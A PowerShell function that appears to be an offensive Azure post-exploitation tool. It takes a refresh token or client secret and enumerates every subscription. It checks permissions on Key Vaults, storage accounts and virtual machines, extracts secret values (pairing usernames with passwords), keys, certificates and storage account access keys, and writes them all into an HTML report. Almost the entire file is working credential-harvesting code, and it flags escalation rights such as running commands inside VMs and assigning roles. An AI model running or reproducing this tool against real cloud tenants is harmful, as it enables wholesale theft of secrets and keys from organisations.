function Invoke-ResourcePermissions {
    param(
        [string]$RefreshToken,
        [string]$ClientId,
        [string]$ClientSecret,
	[string]$TenantID,
        [switch]$KeyVault,
        [switch]$StorageAccount,
        [switch]$VirtualMachine,
        [switch]$All
    )

   	$KeyVaultPermissions = @{
		"Microsoft.KeyVault/*"                      = "Wildcard"
		"Microsoft.KeyVault/vaults/*"                = "Wildcard2"
		"Microsoft.KeyVault/vaults/read"             = "Vault Read"
		"Microsoft.KeyVault/vaults/write"            = "Vault Write"
		"Microsoft.KeyVault/vaults/secrets/read"     = "Secrets Read"
		"Microsoft.KeyVault/vaults/keys/read"        = "Keys Read"
		"Microsoft.KeyVault/vaults/certificates/read"= "Certificates Read"
		}

    $VirtualMachinePermissions = @{
        "Microsoft.Compute/virtualMachines/runCommand/action"     = "Run arbitrary commands inside the VM"
        "Microsoft.Compute/virtualMachines/extensions/write"      = "Deploy or modify VM extensions"
        "Microsoft.Compute/virtualMachines/start/action"          = "Start stopped VM"
        "Microsoft.Compute/virtualMachines/restart/action"        = "Restart VM"
        "Microsoft.Compute/virtualMachines/deallocate/action"     = "Stop VM (without deletion)"
        "Microsoft.Compute/virtualMachines/delete"                = "Delete the VM"
        "Microsoft.Compute/virtualMachines/capture/action"        = "Capture VM image (potential cloning)"
        "Microsoft.Compute/virtualMachines/write"                 = "Modify VM configuration"
        "Microsoft.Compute/virtualMachines/read"                  = "Read VM information and properties"
		"Microsoft.Compute/virtualMachines/*"                     = "another2"
    }

    $StoragePermissions = @{
        "Microsoft.Storage/storageAccounts/listkeys/action"                       = "List storage account access keys"
        "Microsoft.Storage/storageAccounts/regeneratekey/action"                  = "Regenerate access keys"
        "Microsoft.Storage/storageAccounts/blobServices/containers/read"          = "List blob containers"
        "Microsoft.Storage/storageAccounts/blobServices/containers/write"         = "Create or update blob containers"
        "Microsoft.Storage/storageAccounts/blobServices/containers/delete"        = "Delete blob containers"
        "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"    = "Read blobs (file contents)"
        "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write"   = "Upload or modify blobs"
        "Microsoft.Storage/storageAccounts/fileServices/shares/read"              = "List file shares"
        "Microsoft.Storage/storageAccounts/fileServices/shares/write"             = "Create or modify file shares"
        "Microsoft.Storage/storageAccounts/fileServices/shares/delete"            = "Delete file shares"
        "Microsoft.Storage/storageAccounts/read"                                  = "Read storage account configuration"
        "Microsoft.Storage/storageAccounts/write"                                 = "Update storage account settings"
        "Microsoft.Storage/storageAccounts/delete"                                = "Delete the entire storage account"
		"Microsoft.Storage/storageAccounts/*"                                     = "another1"
	
		
    }

    $ResourceAccessPermissions = @{
        "Microsoft.Authorization/roleAssignments/write"  = "Assign roles to users or identities (privilege escalation)"
        "Microsoft.Authorization/elevateAccess/Action"   = "Elevate access to full subscription scope (for tenant admins)"
        "Microsoft.Authorization/*/Write"                = "Wildcard write permission to authorization-related operations"
        "Microsoft.Resources/subscriptions/write"        = "Modify subscription settings"
        "Microsoft.Resources/deployments/write"          = "Deploy ARM templates (create any resource)"
        "Microsoft.Support/*"                            = "Open support tickets (possible info leak)"
        "Microsoft.Resources/tags/write"                 = "Modify resource tags (bypass tag-based policies)"
        "Microsoft.PolicyInsights/*"                     = "Access or modify policy evaluation results"
    }

    #$TenantID = "...." # Edit Here!!!!
    function Get-AccessToken {
        if ($RefreshToken) {
            
            $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
            $body = @{ client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; scope = "https://management.azure.com/.default"; grant_type = "refresh_token"; refresh_token = $RefreshToken }
            $Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
			Write-Host "[+] Access Token received successfully" -ForegroundColor DarkGray
			Write-Host ""
            return $Tokens.access_token
        } elseif ($ClientId -and $ClientSecret) {
            $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
            $body = @{ client_id = $ClientId; client_secret = $ClientSecret; scope = "https://management.azure.com/.default"; grant_type = "client_credentials" }
            $Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
			Write-Host "[+] Access Token received successfully" -ForegroundColor DarkGray
			Write-Host ""
            return $Tokens.access_token
        } else {
            Write-Error "Must provide either -RefreshToken or -ClientId and -ClientSecret."
            exit
        }
    }

    $ARMAccessToken = Get-AccessToken
    $Headers = @{
        'Authorization' = "Bearer $ARMAccessToken"
        'User-Agent'    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }

	$SubUrl = "https://management.azure.com/subscriptions?api-version=2021-01-01"
	$Subscriptions = @()

		do {
			try {
				$response = Invoke-RestMethod -Uri $SubUrl -Headers $Headers
				$Subscriptions += $response.value

				$SubUrl = $response.nextLink
			} catch {
				Write-Warning "Failed to retrieve subscriptions: $($_.Exception.Message)"
				break
			}
		} while ($SubUrl)


	$global:Results = @()


    foreach ($sub in $Subscriptions) {
        $subId = $sub.subscriptionId
        $subName = $sub.displayName
        Write-Host "`n[*] Checking subscription: $subName ($subId)" -ForegroundColor Cyan

			$Resources = @()
				$ResourcesUrl = "https://management.azure.com/subscriptions/$subId/resources?api-version=2021-04-01"

				try {
					do {
						$Response = Invoke-RestMethod -Uri $ResourcesUrl -Headers $Headers
						$Resources += $Response.value

						
						$ResourcesUrl = $Response.nextLink
					} while ($ResourcesUrl)
				}
				catch {
					Write-Warning "Failed to retrieve resources for subscription ${subName}: $($_.Exception.Message)"
					continue
				}

							if ($KeyVault -or $All) {
							$KeyVaults = $Resources | Where-Object { $_.type -eq "Microsoft.KeyVault/vaults" }

							foreach ($kv in $KeyVaults) {
								$kvId = $kv.id
								$kvName = $kv.name
								$kvRg = ($kvId -split '/')[4]

								Write-Host "   [+] Found KeyVault: $kvName in Resource Group: $kvRg" -ForegroundColor Yellow

								try {
									$Permission_Vault_Url = "https://management.azure.com${kvId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
									$permResponse = Invoke-RestMethod -Uri $Permission_Vault_Url -Headers $Headers

									$Vault_Actions = $permResponse.value.actions
									$Vault_NotActions = $permResponse.value.notActions
								} catch {
									Write-Warning "Failed to retrieve permissions for KeyVault $kvName"
									continue
								}

								$PermissionFlags = @{
									MicrosoftKeyVaultWildcard = $false
									VaultWildcard = $false
									VaultsRead = $false
									VaultsWrite = $false
									SecretsRead = $false
									KeysRead = $false
									CertificatesRead = $false
									BadOption = $false
								}
						
								function Get-AccessToken {
									#$TenantID = "...." # You Can Edit here too..
									if ($RefreshToken) {
										$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
										$body = @{
											client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
											scope = "https://vault.azure.net/.default"
											grant_type = "refresh_token"
											refresh_token = $RefreshToken
										}
										$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
										Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
										
										return $Tokens.access_token
									} elseif ($ClientId -and $ClientSecret) {
										$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
										$body = @{
											client_id = $ClientId
											client_secret = $ClientSecret
											scope = "https://vault.azure.net/.default"
											grant_type = "client_credentials"
										}
										$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
										Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
										
										return $Tokens.access_token
									} else {
										Write-Error "Must provide either -RefreshToken or -ClientId and -ClientSecret."
										exit
									}
								}

					
								function Get-VaultItems {
								param (
									[string]$VaultUrl,
									[string]$VaultAccessToken,
									[ValidateSet('secrets', 'keys', 'certificates')]
									[string]$ItemType
								)

								$baseUri = "${VaultUrl}/${ItemType}?api-version=7.3"
								$headers = @{
									'Authorization' = "Bearer $VaultAccessToken"
									'User-Agent'    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
								}

								$AllItems = @()
								$NextUri = $baseUri

								do {
									try {
										$response = Invoke-WebRequest -Uri $NextUri -Headers $headers -UseBasicParsing
										$parsed = $response.Content | ConvertFrom-Json

										$AllItems += $parsed.value

										$NextUri = $parsed.nextLink
									} catch {
										Write-Host "       Failed to fetch $ItemType list from vault"
										break
									}
								} while ($NextUri)

								$DetailedItems = @()

								foreach ($item in $AllItems) {
									$itemUri = if ($ItemType -eq "keys") { $item.kid } else { $item.id }
									try {
										$itemDetailsResponse = Invoke-WebRequest -Uri "$($itemUri)?api-version=7.3" -Headers $headers -UseBasicParsing
										$itemDetails = $itemDetailsResponse.Content | ConvertFrom-Json

										if ($ItemType -eq "secrets") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.id -split '/')[-1]
												Value = $itemDetails.value
											}
										}
										elseif ($ItemType -eq "keys") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.kid -split '/')[-1]
												Value = $itemDetails.key.kid
											}
										}
										elseif ($ItemType -eq "certificates") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.id -split '/')[-1]
												Value = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($itemDetails.cer))
											}
										}
									} catch {
								   
									if ($_.Exception.Response -ne $null) {
										$errorContent = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)
										if ($errorContent.error.code -eq "Forbidden" -or $errorContent.error.innererror.code -eq "ForbiddenByRbac") {
											Write-Host "		[-] Access Denied when fetching $ItemType from Vault" -ForegroundColor Red
											return @("Access Denied")
										}
									}

									Write-Host "       Failed to fetch $ItemType list from vault"
									return @()
										}

								}

								return $DetailedItems
							}
					

						foreach ($VaultPerm in $KeyVaultPermissions.Keys) {
							if ($Vault_NotActions -contains "*" -or $Vault_NotActions -contains $VaultPerm) {
								$PermissionFlags.BadOption = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/*" -or $Vault_Actions -contains "*/read" -or($Vault_Actions -contains "*" -and -not ($Vault_NotActions -contains $VaultPerm))) {
								$PermissionFlags.MicrosoftKeyVaultWildcard = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/*" -or ($Vault_Actions -contains "*" -and -not ($Vault_NotActions -contains $VaultPerm))) {
								$PermissionFlags.VaultWildcard = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.VaultsRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/write" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.VaultsWrite = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/secrets/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.SecretsRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/keys/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.KeysRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/certificates/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.CertificatesRead = $true
							}
						}

					
						if ($PermissionFlags.BadOption) {
							Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor Red
							continue
						}

					   
						if ($PermissionFlags.SecretsRead -or $PermissionFlags.KeysRead -or $PermissionFlags.CertificatesRead -or 
							$PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
							
						
							$VaultAccessToken = Get-AccessToken
							Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
							$VaultUrl = "https://$kvName.vault.azure.net"

							if ($PermissionFlags.SecretsRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$SecretsList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "secrets")
								foreach ($secret in $SecretsList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Secret"
										SecretBaseName   = $secret.Name
										SecretValue      = $secret.Value
									}
								}
							}

							if ($PermissionFlags.KeysRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$KeysList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "keys")
								foreach ($key in $KeysList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Key"
										KeyName          = $key.Name
										KeyValue         = $key.Value
									}
								}
							}

							if ($PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$CertificatesList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "certificates")
								foreach ($cert in $CertificatesList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Certificate"
										CertificateName  = $cert.Name
										CertificateValue = $cert.Value
									}
								}
							}
						} else {
							#Write-Host "      [-] No read permissions detected, skipping token request." -ForegroundColor DarkGray
						}
					}
				}




				if ($PermissionFlags.BadOption) {
					Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor Red
				}

				if ($PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					Write-Host "     [STAR] Found Star Permission on this Vault Resource" -ForegroundColor DarkGreen
				}

				if ($PermissionFlags.VaultsRead) {
					Write-Host "     [READ] Found Read Permission on this Vault" -ForegroundColor DarkGreen
				}

				if ($PermissionFlags.VaultsWrite) {
					Write-Host "     [WRITE] Found Write Permission on this Vault" -ForegroundColor DarkGreen
				}
				
				if ($PermissionFlags.SecretsRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					
					
						$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$SecretsList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "secrets")

						$SecretPairs = @{}
						$LonelySecrets = @()

						foreach ($secret in $SecretsList) {
							if ($secret.Name -match "^(.+?)-(username|password)$") {
								$base = $Matches[1]
								$type = $Matches[2]

								if (-not $SecretPairs.ContainsKey($base)) {
									$SecretPairs[$base] = @{
										Username = $null
										Password = $null
									}
								}
								$SecretPairs[$base][$type] = $secret.Value
							} else {
								$LonelySecrets += $secret
							}
						}

						
						foreach ($baseName in $SecretPairs.Keys) {
							$pair = $SecretPairs[$baseName]
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Secret-Pair"
								SecretBaseName   = $baseName
								Username         = $pair.Username
								Password         = $pair.Password
							}
						}

						
						foreach ($secret in $LonelySecrets) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Secret"
								SecretBaseName   = $secret.Name
								SecretValue      = $secret.Value
							}
						}
								
					
					
				}

				if ($PermissionFlags.KeysRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$KeysList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "keys")

						foreach ($key in $KeysList) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Key"
								KeyName          = $key.Name
								KeyValue         = $key.Value
							}
						}
				}

				if ($PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$CertificatesList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "certificates")

						foreach ($cert in $CertificatesList) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Certificate"
								CertificateName  = $cert.Name
								CertificateValue = $cert.Value
							}
						}
				}

				


				if ($SecretsList.Count -gt 0 -or $KeysList.Count -gt 0 -or $CertificatesList.Count -gt 0) {
						$global:Results += [PSCustomObject]@{
							SubscriptionName = $subName
							ResourceGroup    = $kvRg  
							ResourceName     = $kvName
							ResourceType     = "KeyVault" 
							Secrets          = ($SecretsList -join "<br>") 
							Keys             = ($KeysList -join "<br>")
							Certificates     = ($CertificatesList -join "<br>")
						}
					}

	

		
       

        if ($StorageAccount -or $All) {
				$StorageAccounts = $Resources | Where-Object { $_.type -eq "Microsoft.Storage/storageAccounts" }
				foreach ($sa in $StorageAccounts) {
					$saId = $sa.id
					$saName = $sa.name
					$saRg = ($saId -split '/')[4]

					Write-Host "   [+] Found StorageAccount: $saName in Resource Group: $saRg" -ForegroundColor Yellow

					try {
						$Permission_Storage_Url = "https://management.azure.com${saId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						$permResponse = Invoke-RestMethod -Uri $Permission_Storage_Url -Headers $Headers

						$Storage_Actions = $permResponse.value.actions
						$Storage_NotActions = $permResponse.value.notActions
					} catch {
						#Write-Warning "Failed to retrieve permissions for StorageAccount $saName"
						continue
					}

					$FoundInteresting = $false
					$FoundConflict = $false
					$FoundBad = $false

					foreach ($StoragePerm in $StoragePermissions.Keys) {
						if ($Storage_Actions -contains $StoragePerm -and -not ($Storage_NotActions -contains $StoragePerm)) {
							$FoundInteresting = $true
						} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains $StoragePerm) {
							$FoundConflict = $true
						} elseif ($Storage_Actions -contains "*" -and -not ($Storage_NotActions -contains $StoragePerm)) {
							$FoundInteresting = $true
						} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains "*") {
							$FoundBad = $true
						}
					}

					if ($FoundConflict) {
						Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor DarkRed
						Write-Host ""
					}

					if ($FoundBad) {
						Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
						Write-Host ""
					}

					if ($FoundInteresting) {
						Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen

						$Storageurl = "https://management.azure.com${saId}/listKeys?api-version=2024-01-01"
						$Headers = @{
							'Content-Type' = "application/json"
							'Authorization' = "Bearer $ARMAccessToken"
							'User-Agent' = "Mozilla/5.0"
						}

						try {
							$StorageResponse = Invoke-RestMethod -Uri $Storageurl -Headers $Headers -Method POST
							if ($StorageResponse.keys) {
								$keys = @($StorageResponse.keys)
								Write-Host "       [+] Key1: $($keys[0].value)" -ForegroundColor Yellow
								Write-Host "       [+] Key2: $($keys[1].value)" -ForegroundColor Yellow

								$global:Results += [PSCustomObject]@{
									SubscriptionName = $subName
									ResourceGroup    = $saRg
									ResourceName     = $saName
									ResourceType     = "StorageAccount"
									Key1             = $keys[0].value
									Key2             = $keys[1].value
								}
							} else {
								Write-Warning "No keys returned from the Storage account!"
							}
						} catch {
							#Write-Host "Failed to get Storage keys:" -ForegroundColor Red
							#Write-Host $_.Exception.Message -ForegroundColor Red
							continue
						}

						Write-Host ""
					}

					if (-not ($FoundInteresting -or $FoundConflict -or $FoundBad)) {
						# Write-Host "    [-] No special permissions found" -ForegroundColor Red
					}
				}
			}


        if ($VirtualMachine -or $All) {
            $VirtualMachines = $Resources | Where-Object { $_.type -eq "Microsoft.Compute/virtualMachines" }
            foreach ($vm in $VirtualMachines) {
                $vmId = $vm.id
                $vmName = $vm.name
				$vmRg   = ($vmId -split '/')[4]
				
                Write-Host "   [+] Found Virtual Machine: $vmName in Resource Group: $vmRg" -ForegroundColor Yellow

                try {
                    $Permission_VM_Url = "https://management.azure.com${vmId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						
							$permResponse = Invoke-RestMethod -Uri $Permission_VM_Url -Headers $Headers
							$VM_Actions = $permResponse.value.actions
							$VM_NotActions = $permResponse.value.notActions
                } catch {
							Write-Warning "Failed to retrieve permissions for VM $vmName"
							continue
                }
				
				$FoundGREAT = $false
				$FoundConflict = $false
				$FoundWOW = $false
				$FoundBAD = $false

                foreach ($VirtualPerm in $VirtualMachinePermissions.Keys) {

                    if ($VM_Actions -contains $VirtualPerm -and -not ($VM_NotActions -contains $VirtualPerm))
					{
						$FoundGREAT = $true
                    } 
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains $VirtualPerm) 
					{
						$FoundConflict = $true
                    } 
					elseif ($VM_Actions -contains '*' -and -not ($VM_NotActions -contains $VirtualPerm))
					{
						  $FoundWOW = $true
					}
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains '*') {
						$FoundBAD = $true
                    } else {
 
                    }
				}
                
				if ($FoundGREAT) {
					Write-Host "      [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundConflict) {
					Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor Yellow
					Write-Host " "
				}
				if ($FoundWOW) {
					Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundBAD) {
					Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
					Write-Host " "
				}
				if (-not ($FoundGREAT -or $FoundConflict -or $FoundWOW -or $FoundBAD)) {
					#Write-Host "    [-] No special permissions found" -ForegroundColor Red
					
				}
				
				if ($FoundGREAT -or $FoundWOW) {
				$global:Results += [PSCustomObject]@{
					SubscriptionName = $subName
					ResourceGroup    = $vmRg   
					ResourceName     = $vmName 
					ResourceType     = "VirtualMachine" 
				}

				
            }
        }
		}

	}
if ($global:Results.Count -gt 0) {

# Header
$htmlHeader = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Permissions Report</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <style>
        body {
            padding: 20px;
            background-color: #f0f2f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        h1 {
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            color: #007bff;
        }
        .nav-tabs .nav-link {
            color: #007bff;
        }
        .nav-tabs .nav-link.active {
            color: white;
            background-color: #007bff;
        }
        .table {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        table.dataTable td, table.dataTable th {
            white-space: normal; /* במקום nowrap */
            word-break: break-word; /* שובר שורות ארוכות */
            max-width: 400px; /* מגביל את הרוחב */
        }
        table.dataTable th {
            background-color: #007bff;
            color: white;
        }
        .copy-btn, .view-btn {
            margin-top: 3px;
            display: inline-block;
            font-size: 12px;
            padding: 3px 8px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            color: white;
            transition: background-color 0.3s;
        }
        .copy-btn {
            background-color: #28a745;
        }
        .copy-btn:hover {
            background-color: #218838;
        }
        .view-btn {
            background-color: #6c757d;
            margin-left: 5px;
        }
        .view-btn:hover {
            background-color: #5a6268;
        }
        .modal-content {
            word-break: break-word;
        }
    </style>
</head>

<body>

<h1>Permissions Report</h1>

<div class="container-fluid">
    <ul class="nav nav-tabs mb-3" id="permissionsTab" role="tablist">
        <li class="nav-item">
            <button class="nav-link active" id="kv-tab" data-bs-toggle="tab" data-bs-target="#kv" type="button" role="tab">Key Vaults</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="sa-tab" data-bs-toggle="tab" data-bs-target="#sa" type="button" role="tab">Storage Accounts</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="vm-tab" data-bs-toggle="tab" data-bs-target="#vm" type="button" role="tab">Virtual Machines</button>
        </li>
    </ul>

    <div class="tab-content" id="permissionsTabContent">
"@

# ---------------------------------------------------------------------------------------------------

# עיבוד התוצאות
$KeyVaults = $global:Results | Where-Object { $_.ResourceType -match "^KeyVault" }
$StorageAccounts = $global:Results | Where-Object { $_.ResourceType -eq "StorageAccount" }
$VirtualMachines = $global:Results | Where-Object { $_.ResourceType -eq "VirtualMachine" }

$GroupedKeyVaults = $KeyVaults | Group-Object -Property ResourceName

# -- Key Vaults Table
$htmlKV = @"
<div class="tab-pane fade show active" id="kv" role="tabpanel" aria-labelledby="kv-tab">
    <table id="kvTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Secrets</th>
            <th>Keys</th>
            <th>Certificates</th>
        </tr></thead>
        <tbody>
"@

$htmlKV += ($GroupedKeyVaults | ForEach-Object {
    $kvGroup = $_.Group
    $subName = $kvGroup[0].SubscriptionName
    $rgName = $kvGroup[0].ResourceGroup
    $kvName = $kvGroup[0].ResourceName

    $secrets = @()
    $keys = @()
    $certs = @()

    foreach ($item in $kvGroup) {
        switch ($item.ResourceType) {
            "KeyVault-Secret-Pair" { 
                $secrets += "$($item.SecretBaseName)-username: $($item.Username)<br>$($item.SecretBaseName)-password: $($item.Password)" 
            }
            "KeyVault-Secret" {
                $secrets += "$($item.SecretBaseName): $($item.SecretValue)"
            }
            "KeyVault-Key" {
                $keys += "$($item.KeyName): $($item.KeyValue)"
            }
            "KeyVault-Certificate" {
                $certs += "$($item.CertificateName): $($item.CertificateValue)"
            }
        }
    }

    $secretsCell = if ($secrets.Count -gt 0) { $secrets -join "<br>" } else { "<span class='badge bg-secondary'>No Secrets</span>" }
    $keysCell = if ($keys.Count -gt 0) { $keys -join "<br>" } else { "<span class='badge bg-secondary'>No Keys</span>" }
    $certsCell = if ($certs.Count -gt 0) { $certs -join "<br>" } else { "<span class='badge bg-secondary'>No Certificates</span>" }

    "<tr>
        <td>$subName</td>
        <td>$rgName</td>
        <td>$kvName</td>
        <td>$secretsCell</td>
        <td>$keysCell</td>
        <td>$certsCell</td>
    </tr>"
}) -join "`n"

$htmlKV += @"
        </tbody>
    </table>
</div>
"@

# -- Storage Accounts Table
$htmlSA = @"
<div class="tab-pane fade" id="sa" role="tabpanel" aria-labelledby="sa-tab">
    <table id="saTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Key1</th>
            <th>Key2</th>
        </tr></thead>
        <tbody>
"@

$htmlSA += ($StorageAccounts | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
        <td style='word-break: break-word;'>$($_.Key1)</td>
        <td style='word-break: break-word;'>$($_.Key2)</td>
    </tr>"
}) -join "`n"

$htmlSA += @"
        </tbody>
    </table>
</div>
"@

# -- Virtual Machines Table
$htmlVM = @"
<div class="tab-pane fade" id="vm" role="tabpanel" aria-labelledby="vm-tab">
    <table id="vmTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
        </tr></thead>
        <tbody>
"@

$htmlVM += ($VirtualMachines | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
    </tr>"
}) -join "`n"

$htmlVM += @"
        </tbody>
    </table>
</div>
"@

# Footer
$htmlFooter = @"
    </div> <!-- End tab-content -->

</div> <!-- End container -->

<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>

<script>
`$(document).ready(function() {
    $('#kvTable').DataTable({ scrollX: true });
    $('#saTable').DataTable({ scrollX: true });
    $('#vmTable').DataTable({ scrollX: true });
});
</script>

</body>
</html>
"@

# ----------------------------------------------------------------

$htmlContent = $htmlHeader + $htmlKV + $htmlSA + $htmlVM + $htmlFooter

$htmlFilePath = "C:\Users\Shugi\Invoke-ResourcePermissions-Report.html"
$htmlContent | Set-Content -Path $htmlFilePath -Encoding UTF8

Write-Host "`n[+] Report saved to $htmlFilePath" -ForegroundColor Green

}
else {
    Write-Host "`n[-] No interesting resources found. No report generated." -ForegroundColor Yellow
}


}
